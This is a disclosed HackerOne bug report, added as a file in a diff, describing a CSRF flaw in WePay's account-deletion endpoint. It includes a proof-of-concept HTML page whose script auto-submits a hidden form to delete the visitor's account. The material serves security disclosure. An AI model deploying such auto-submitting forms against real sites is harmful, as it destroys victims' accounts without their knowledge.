@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/26866
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/yassineaboukir
+ReportedTo:WePay(wepay)
+BountyAmount:350.0
+Severity:
+State:Closed
+DateOfDisclosure:13.08.2015 13:36:18
+
+Summary:
+
+I have found that delete action is vulnerable to CSRF and could lead to the principal account to be deleted once the victim visit the attacker's fake page.
+
+Proof Of Concept : (WARNING: I am submitting the form using JS, so only by accessing a page with the code below will lead to account deletion)
+-----------------------------------------------------------------
+<html>
+<form method="post" name="formsubmit" action="https://www.wepay.com/settings/delete" >
+		<input type="hidden" name="csrf" value="" />
+		<input type="hidden" name="nonce" value="" />	
+<script type="text/javascript" language="JavaScript">
+//submit form
+document.formsubmit.submit();
+</script>
+</form>
+</html>
+
+Best regards,
+Yassine ABOUKIR
